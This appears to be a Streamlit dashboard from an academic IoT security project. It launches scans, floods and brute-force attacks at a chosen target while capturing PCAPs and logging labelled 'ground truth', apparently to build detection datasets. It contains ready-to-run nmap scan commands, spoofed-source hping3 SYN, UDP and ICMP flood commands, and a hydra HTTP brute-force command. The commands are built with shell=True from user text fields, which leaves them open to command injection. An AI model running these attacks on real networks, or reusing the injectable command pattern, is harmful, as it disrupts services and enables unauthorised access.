import streamlit as st
import subprocess
import time
import json
import os
from datetime import datetime

# --- CONFIGURAÇÃO DA PÁGINA ---
st.set_page_config(page_title="Attack Framework - ISEP", layout="wide")
st.title("🛡️ Dashboard de Injeção de Ataques IoT")

# --- SIDEBAR: CONFIGURAÇÕES DE REDE ---
st.sidebar.header("⚙️ Configurações de Rede")
target_ip = st.sidebar.text_input("IP do Alvo (Router)", value="192.168.1.1")
interface = st.sidebar.text_input("Interface de Injeção (Ataque)", value="eth1")
monitor_interface = st.sidebar.text_input("Interface de Monitorização", value="eth0")
target_subnet = st.sidebar.text_input("Target Subnet", value="192.168.1.0/24")

st.sidebar.divider()
if st.sidebar.button("🗑️ Limpar Histórico de Logs"):
    if os.path.exists("attack_log.json"):
        os.remove("attack_log.json")
        st.sidebar.success("Logs eliminados!")
        st.rerun()

# --- FUNÇÃO PARA LOGGING (GROUND TRUTH) ---
def log_attack(attack_type, variant, start_time, end_time, pcap_file):
    entry = {
        "timestamp_start": start_time,
        "timestamp_end": end_time,
        "attack": attack_type,
        "variant": variant,
        "target": target_ip,
        "pcap_generated": pcap_file,
        "status": "SUCCESS"
    }
    with open("attack_log.json", "a") as f:
        f.write(json.dumps(entry) + "\n")

# --- FUNÇÃO MESTRE: ORQUESTRAÇÃO (CAPTURAR + ATACAR) ---
def run_command(cmd, attack_type, variant):
    # Criar nome único para o ficheiro PCAP
    timestamp_id = int(time.time())
    pcap_name = f"ataque_{variant}_{timestamp_id}.pcap"
    pcap_path = f"/tmp/{pcap_name}"
    
    start_dt = datetime.now()
    start_iso = start_dt.isoformat()
    
    # Criar um placeholder para mensagens de status
    status_text = st.empty()
    
    try:
        # 1. Iniciar Captura (Tshark) em background na interface de monitorização
        status_text.info(f"🛰️ A iniciar captura na {monitor_interface}...")
        tshark_proc = subprocess.Popen([
            "sudo", "tshark", "-i", monitor_interface, "-w", pcap_path
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        time.sleep(2) # Pausa para garantir que o tshark está a gravar

        # 2. Executar o Ataque Real
        status_text.warning(f"⚔️ A injetar {variant} via {interface}...")
        process = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        # 3. Parar a Captura
        status_text.info("🏁 A finalizar captura e a processar ficheiro...")
        tshark_proc.terminate()
        time.sleep(1) # Aguardar fecho do ficheiro
        
        # 4. Ajustar permissões do PCAP para o utilizador kali conseguir abrir
        subprocess.run(["sudo", "chown", "kali:kali", pcap_path])
        
        end_iso = datetime.now().isoformat()
        
        # 5. Registar no Log de Ground Truth
        log_attack(attack_type, variant, start_iso, end_iso, pcap_name)
        
        status_text.success(f"✅ Experiência Concluída! PCAP: {pcap_name}")
        
        # Mostrar o output do comando (opcional)
        with st.expander("Ver detalhes do comando (Console Output)"):
            st.code(process.stdout)
            
    except Exception as e:
        st.error(f"Erro na orquestração: {e}")

# --- INTERFACE PRINCIPAL (TABS) ---
tab1, tab2, tab3, tab4 = st.tabs(["Scanning Vertical", "Scanning Horizontal", "DDoS/Flood", "Brute Force"])

with tab1:
    st.header("🔍 Varrimento Vertical (Router)")
    st.write("Identificação de serviços e portas abertas no gateway.")
    col1, col2, col3 = st.columns(3)
    if col1.button("V1: SYN Scan"):
        run_command(f"sudo nmap -e {interface} -sS -p 1-1024 {target_ip}", "Port Scan", "SYN-Vertical")
    if col2.button("V2: Connect Scan"):
        run_command(f"sudo nmap -e {interface} -sT -p 1-1024 {target_ip}", "Port Scan", "Connect-Vertical")
    if col3.button("V3: UDP Scan"):
        run_command(f"sudo nmap -e {interface} -sU -p 53,161,1900 {target_ip}", "Port Scan", "UDP-Vertical")

with tab2:
    st.header("🌐 Varrimento Horizontal (LAN)")
    st.write("Descoberta de vizinhança e movimento lateral.")
    col1, col2, col3 = st.columns(3)
    if col1.button("V1: Ping Sweep"):
        run_command(f"sudo nmap -e {interface} -sn {target_subnet}", "Network Scan", "Ping-Sweep")
    if col2.button("V2: Web Sweep"):
        run_command(f"sudo nmap -e {interface} -sS -p 80,443 {target_subnet}", "Network Scan", "Web-Discovery")
    if col3.button("V3: OS Fingerprinting"):
        st.warning("Este ataque é lento (aprox. 13 min).")
        run_command(f"sudo nmap -e {interface} -O --osscan-limit {target_subnet}", "Network Scan", "OS-Fingerprinting")    

with tab3:
    st.header("💣 DDoS Volumétrico")
    st.write("Ataques de inundação para teste de robustez (15 segundos).")
    col1, col2, col3 = st.columns(3)
    if col1.button("V1: SYN Flood"):
        run_command(f"sudo timeout 15 hping3 -S --flood -V -p 80 --rand-source -I {interface} {target_ip}", "DDoS", "SYN-Flood")
    if col2.button("V2: UDP Flood"):
        run_command(f"sudo timeout 15 hping3 --udp --flood -V -p 53 --rand-source -I {interface} {target_ip}", "DDoS", "UDP-Flood")
    if col3.button("V3: ICMP Flood"):
        run_command(f"sudo timeout 15 hping3 -1 --flood -V --rand-source -I {interface} {target_ip}", "DDoS", "ICMP-Flood")  

with tab4:
    st.header("🔑 Acesso (Brute Force)")
    st.write("Tentativas de quebra de autenticação na interface Web.")
    if st.button("Executar HTTP Brute Force"):
        run_command(f"hydra -l admin -P /usr/share/wordlists/fasttrack.txt -t 4 {target_ip} http-get /:F=failed", "Brute Force", "HTTP-Login")

# --- SECÇÃO DE LOGS (GROUND TRUTH) ---
st.divider()
st.subheader("📜 Repositório de Ground Truth (Mais recentes primeiro)")

if os.path.exists("attack_log.json"):
    with open("attack_log.json", "r") as f:
        logs = f.readlines()
        for log in reversed(logs):
            st.json(json.loads(log))
else:
    st.info("Aguardando o primeiro ataque para gerar logs.")
